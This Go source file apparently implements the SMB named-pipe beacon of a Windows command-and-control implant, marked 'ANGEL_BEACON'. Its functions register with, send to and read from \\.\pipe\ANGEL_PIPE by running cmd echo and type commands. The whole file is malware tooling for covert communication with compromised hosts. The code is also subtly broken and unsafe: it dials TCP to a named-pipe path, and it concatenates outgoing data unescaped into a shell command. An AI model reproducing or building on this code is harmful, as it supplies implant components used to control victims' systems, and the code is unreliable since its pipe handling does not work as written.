//go:build windows

package smb_beacon

import (
"net"
"os/exec"
"strings"
"time"
)

func SMBBeaconConnect(namedPipe string) (net.Conn, error) {
return net.DialTimeout("tcp", namedPipe, 10*time.Second)
}

func SMBBeaconRegister() bool {
cmd := exec.Command("cmd", "/c", "echo ANGEL_BEACON > \\\\.\\pipe\\ANGEL_PIPE")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func SMBBeaconSend(data string) bool {
cmd := exec.Command("cmd", "/c", "echo "+data+" > \\\\.\\pipe\\ANGEL_PIPE")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func SMBBeaconRecv() string {
cmd := exec.Command("cmd", "/c", "type \\\\.\\pipe\\ANGEL_PIPE")
output, err := cmd.Output()
if err != nil {
return "Error: " + err.Error()
}
return strings.TrimSpace(string(output))
}
